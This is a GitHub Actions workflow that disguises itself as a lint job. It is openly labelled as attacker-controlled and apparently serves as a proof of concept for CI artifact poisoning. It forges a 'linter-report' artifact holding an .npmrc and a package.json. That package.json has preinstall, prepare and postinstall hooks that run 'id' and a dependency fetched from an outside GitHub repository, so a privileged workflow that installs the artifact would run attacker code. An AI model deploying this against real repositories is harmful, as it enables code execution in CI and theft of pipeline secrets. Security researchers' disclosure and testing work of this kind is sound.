name: Lint
on:
  pull_request:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Attacker-controlled lint job forging the report artifact
        run: |
          mkdir -p poc
          echo "POC report from forged Lint workflow" > poc/linter-report.txt
          echo "1" > poc/pr-number.txt
          printf 'foreground-scripts=true\n' > poc/.npmrc
          cat > poc/package.json <<'PKG'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "scripts": {
              "preinstall": "echo ROOT_PREINSTALL_EXECUTED; id",
              "prepare": "echo ROOT_PREPARE_EXECUTED; id",
              "postinstall": "echo ROOT_POSTINSTALL_EXECUTED; id"
            },
            "dependencies": {
              "gab-poc-npm-dep": "github:PDFtoMark/gab-poc-npm-dep"
            }
          }
          PKG
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: poc/**/*
          include-hidden-files: true
